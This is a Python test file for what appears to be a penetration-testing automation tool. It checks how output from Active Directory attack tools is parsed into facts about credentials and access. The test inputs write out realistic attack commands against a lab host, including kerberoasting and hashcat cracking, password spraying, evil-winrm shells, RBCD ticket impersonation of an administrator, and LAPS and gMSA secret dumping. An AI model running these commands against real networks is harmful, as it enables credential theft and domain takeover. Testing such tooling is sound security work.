import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from obol.facts import Fact, ProofState
from obol.pack import friendly, load_pack
from obol.parsers import parse_action_output
from obol.workspace import Workspace


def _workspace() -> Workspace:
    ws = Workspace(Path("/tmp/obol-ad-path-expansion-test"))
    ws.target = "10.10.10.10"
    ws.add_scope(ws.target)
    ws.facts.add(Fact("target.configured", "host:10.10.10.10", {"target": ws.target}, source="test"))
    ws.facts.add(Fact("ad.domain_known", "domain:corp.local", {"name": "corp.local"}, source="test"))
    return ws


def _action(action_id: str):
    return next(action for action in load_pack() if action.id == action_id)


def test_kerberoast_parser_produces_tgs_candidate_material_only():
    ws = _workspace()
    action = _action("kerberoast")
    out = "$krb5tgs$23$*svc-sql$CORP.LOCAL$MSSQLSvc/sql.corp.local:1433*$abcdef0123456789\n"
    facts = parse_action_output(
        action,
        ws,
        "nxc ldap 10.10.10.10 -u svc-audit -p 'Spring2026!' --kerberoasting tgs.txt",
        out,
        "",
        "test",
    )
    kinds = {fact.kind for fact in facts}
    assert {"hash.tgs", "credential.candidate"} <= kinds
    assert "credential.available" not in kinds
    assert "access.admin" not in kinds


def test_hashcat_tgs_show_produces_plaintext_credential_not_access():
    ws = _workspace()
    action = _action("kerberoast")
    out = "$krb5tgs$23$*svc-sql$CORP.LOCAL$MSSQLSvc/sql.corp.local:1433*$abcdef0123456789:SqlSvc2026!\n"
    facts = parse_action_output(
        action,
        ws,
        "hashcat -m 13100 tgs.hashes rockyou.txt --show",
        out,
        "",
        "test",
    )
    plain = next(fact for fact in facts if fact.kind == "credential.plaintext")
    assert plain.value["user"] == "svc-sql"
    assert plain.value["password"] == "SqlSvc2026!"
    assert plain.value["hash_type"] == "tgs"
    kinds = {fact.kind for fact in facts}
    assert "credential.available" in kinds
    assert "access.admin" not in kinds
    assert "foothold.windows" not in kinds


def test_nxc_smb_validates_credential_without_admin_or_shell():
    ws = _workspace()
    action = _action("password-spray")
    out = "SMB         10.10.10.10     445    DC01         [+] corp.local\\svc-audit:Spring2026!\n"
    facts = parse_action_output(
        action,
        ws,
        "nxc smb 10.10.10.10 -u svc-audit -p 'Spring2026!'",
        out,
        "",
        "test",
    )
    kinds = {fact.kind for fact in facts}
    assert {"credential.available", "smb.authenticated"} <= kinds
    assert "access.admin" not in kinds
    assert "foothold.windows" not in kinds


def test_nxc_pwn3d_validates_admin_access_without_system():
    ws = _workspace()
    action = _action("password-spray")
    out = "SMB         10.10.10.10     445    DC01         [+] CORP\\administrator:Winter2026! (Pwn3d!)\n"
    facts = parse_action_output(
        action,
        ws,
        "nxc smb 10.10.10.10 -u administrator -p 'Winter2026!'",
        out,
        "",
        "test",
    )
    admin = next(fact for fact in facts if fact.kind == "access.admin")
    assert admin.scope == "host:10.10.10.10"
    kinds = {fact.kind for fact in facts}
    assert {"credential.available", "smb.authenticated", "access.admin"} <= kinds
    assert "credential.admin" not in kinds
    assert "access.system" not in kinds


def test_nxc_winrm_success_is_foothold_not_admin_without_pwn3d():
    ws = _workspace()
    action = _action("password-spray")
    out = "WINRM       10.10.10.10     5985   DC01         [+] corp.local\\svc-audit:Spring2026!\n"
    facts = parse_action_output(
        action,
        ws,
        "nxc winrm 10.10.10.10 -u svc-audit -p 'Spring2026!'",
        out,
        "",
        "test",
    )
    kinds = {fact.kind for fact in facts}
    assert {"credential.available", "winrm.authenticated", "foothold.windows"} <= kinds
    assert "access.admin" not in kinds
    assert "access.system" not in kinds


def test_nxc_ssh_and_ftp_auth_validate_services_without_shell_or_admin():
    ws = _workspace()
    action = _action("password-spray")
    out = """
SSH         10.10.10.10     22     LINUX01      [+] corp.local\\svc-audit:Spring2026!
FTP         10.10.10.10     21     FTP01        [+] corp.local\\svc-audit:Spring2026!
"""
    facts = parse_action_output(
        action,
        ws,
        "nxc ssh 10.10.10.10 -u svc-audit -p 'Spring2026!'",
        out,
        "",
        "test",
    )
    kinds = {fact.kind for fact in facts}
    assert {"ssh.reachable", "ftp.reachable", "ssh.authenticated", "ftp.authenticated", "credential.available"} <= kinds
    assert "foothold.linux" not in kinds
    assert "access.shell" not in kinds
    assert "access.admin" not in kinds


def test_nxc_failure_records_refuted_validation_without_credential():
    ws = _workspace()
    action = _action("password-spray")
    out = "SMB         10.10.10.10     445    DC01         [-] corp.local\\svc-audit:Wrong! STATUS_LOGON_FAILURE\n"
    facts = parse_action_output(
        action,
        ws,
        "nxc smb 10.10.10.10 -u svc-audit -p 'Wrong!'",
        out,
        "",
        "test",
    )
    validation = next(fact for fact in facts if fact.kind == "credential.validation")
    assert validation.state is ProofState.REFUTED
    assert validation.value["reason"] == "logon_failure"
    kinds = {fact.kind for fact in facts}
    assert "credential.available" not in kinds
    assert "access.admin" not in kinds


def test_evil_winrm_prompt_proves_windows_foothold_not_admin():
    ws = _workspace()
    action = _action("password-spray")
    out = """
Evil-WinRM shell v3.7
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\svc-audit\\Documents>
"""
    facts = parse_action_output(
        action,
        ws,
        "evil-winrm -i 10.10.10.10 -u svc-audit -p 'Spring2026!'",
        out,
        "",
        "test",
    )
    kinds = {fact.kind for fact in facts}
    assert {"credential.available", "winrm.authenticated", "foothold.windows"} <= kinds
    assert "access.admin" not in kinds
    assert "access.system" not in kinds


def test_bloodhound_collection_proves_graph_not_attack_path_or_access():
    ws = _workspace()
    action = _action("bloodhound-collect")
    out = """
INFO: Found AD domain: corp.local
INFO: Compressing output into 20260914010101_bloodhound.zip
INFO: Done in 00M 12S
"""
    facts = parse_action_output(
        action,
        ws,
        "bloodhound-python -d corp.local -u svc-audit -p 'Spring2026!' -ns 10.10.10.10 -c All --zip",
        out,
        "",
        "test",
    )
    graph = next(fact for fact in facts if fact.kind == "ad.graph.collected")
    assert graph.value["archives"] == ["20260914010101_bloodhound.zip"]
    kinds = {fact.kind for fact in facts}
    assert "ad.attack_paths" not in kinds
    assert "access.admin" not in kinds


def test_bloodhound_analysis_output_can_prove_attack_path_only():
    ws = _workspace()
    action = _action("bloodhound-collect")
    out = "Shortest Path to Domain Admins returned 1 attack path for svc-audit\n"
    facts = parse_action_output(action, ws, "bloodhound", out, "", "test")
    kinds = {fact.kind for fact in facts}
    assert "ad.attack_paths" in kinds
    assert "ad.graph.collected" not in kinds
    assert "access.admin" not in kinds


def test_bloodyad_success_records_control_path_not_access():
    ws = _workspace()
    action = _action("bloodyad-acl")
    out = """
[+] svc-audit successfully added to group Help Desk Operators
distinguishedName: CN=Help Desk Operators,CN=Users,DC=corp,DC=local
ActiveDirectoryRights: GenericAll
"""
    facts = parse_action_output(
        action,
        ws,
        "bloodyAD -d corp.local --host 10.10.10.10 -u svc-audit -p 'Spring2026!' add groupMember \"Help Desk Operators\" svc-audit",
        out,
        "",
        "test",
    )
    control = next(fact for fact in facts if fact.kind == "ad.control_paths")
    assert "GenericAll" in control.value["rights"]
    assert control.value["operation"] == "group_member_write"
    kinds = {fact.kind for fact in facts}
    assert "credential.available" not in kinds
    assert "access.admin" not in kinds


def test_addcomputer_success_records_machine_candidate_not_login():
    ws = _workspace()
    action = _action("delegation-abuse")
    out = "[*] Successfully added machine account OBOL$ with password MachinePass123!\n"
    facts = parse_action_output(
        action,
        ws,
        "impacket-addcomputer corp.local/svc-audit:Spring2026! -dc-ip 10.10.10.10 -computer-name OBOL$ -computer-pass MachinePass123!",
        out,
        "",
        "test",
    )
    added = next(fact for fact in facts if fact.kind == "ad.computer_added")
    assert added.value["computer"] == "OBOL$"
    candidate = next(fact for fact in facts if fact.kind == "credential.candidate")
    assert candidate.value["kind"] == "machine_account"
    assert candidate.value["user"] == "OBOL$"
    kinds = {fact.kind for fact in facts}
    assert "credential.available" not in kinds
    assert "foothold.windows" not in kinds
    assert "access.admin" not in kinds


def test_rbcd_and_getst_record_control_path_and_ticket_not_admin():
    ws = _workspace()
    action = _action("getst-impersonation")
    out = """
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity modified successfully
[*] Impersonating administrator
[*] Saving ticket in administrator.ccache
"""
    facts = parse_action_output(
        action,
        ws,
        "impacket-rbcd -delegate-from OBOL$ -delegate-to WEB01$ -action write corp.local/svc-audit:Spring2026! && impacket-getST -spn cifs/WEB01.corp.local -impersonate administrator corp.local/OBOL$:MachinePass123!",
        out,
        "",
        "test",
    )
    kinds = {fact.kind for fact in facts}
    assert {"ad.control_paths", "kerberos.tickets"} <= kinds
    ticket = next(fact for fact in facts if fact.kind == "kerberos.tickets")
    assert ticket.value["principal"] == "administrator"
    assert ticket.value["files"] == ["administrator.ccache"]
    assert "access.admin" not in kinds
    assert "foothold.windows" not in kinds


def test_ticket_filename_in_command_alone_does_not_prove_ticket():
    ws = _workspace()
    action = _action("kerberos-tickets")
    facts = parse_action_output(
        action,
        ws,
        "export KRB5CCNAME=administrator.ccache && klist",
        "klist: No credentials cache found (filename: administrator.ccache)\n",
        "",
        "test",
    )
    assert "kerberos.tickets" not in {fact.kind for fact in facts}


def test_laps_output_is_candidate_not_blanket_admin():
    ws = _workspace()
    action = _action("laps-read")
    out = """
LDAP        10.10.10.10 389 DC01 [*] Running LAPS module
Computer: WEB01$ User: Administrator Password: LocalAdmin2026!
Computer: FILE01$ User: Adm-LAPS Password: FileOnly2026!
"""
    facts = parse_action_output(
        action,
        ws,
        "nxc ldap 10.10.10.10 -u svc-audit -p 'Spring2026!' -M laps",
        out,
        "",
        "test",
    )
    candidates = [fact for fact in facts if fact.kind == "credential.candidate"]
    assert {item.value["computer"] for item in candidates} == {"WEB01$", "FILE01$"}
    assert any(item.value["password"] == "LocalAdmin2026!" for item in candidates)
    kinds = {fact.kind for fact in facts}
    assert "credential.plaintext" not in kinds
    assert "credential.available" not in kinds
    assert "access.admin" not in kinds


def test_gmsa_output_records_ntlm_hash_not_validated_access():
    ws = _workspace()
    action = _action("gmsa-read")
    out = "corp.local\\svc_web$: NTLM: 11223344556677889900aabbccddeeff\n"
    facts = parse_action_output(
        action,
        ws,
        "gMSADumper.py -u svc-audit -p 'Spring2026!' -d corp.local",
        out,
        "",
        "test",
    )
    ntlm = next(fact for fact in facts if fact.kind == "credential.ntlm_hash")
    assert ntlm.value["user"] == "svc_web$"
    assert ntlm.value["nthash"] == "11223344556677889900aabbccddeeff"
    kinds = {fact.kind for fact in facts}
    assert "credential.available" not in kinds
    assert "access.admin" not in kinds


def test_new_fact_labels_are_friendly():
    assert friendly("smb.authenticated") == "authenticated SMB access"
    assert friendly("ldap.authenticated") == "authenticated LDAP access"
    assert friendly("winrm.authenticated") == "authenticated WinRM access"
    assert friendly("credential.validation") == "credential validation evidence"
    assert friendly("ssh.reachable") == "SSH is reachable"
    assert friendly("ftp.anonymous_login") == "anonymous FTP login"
    assert friendly("snmp.info") == "SNMP system info"
    assert friendly("web.tech") == "web technology fingerprints"
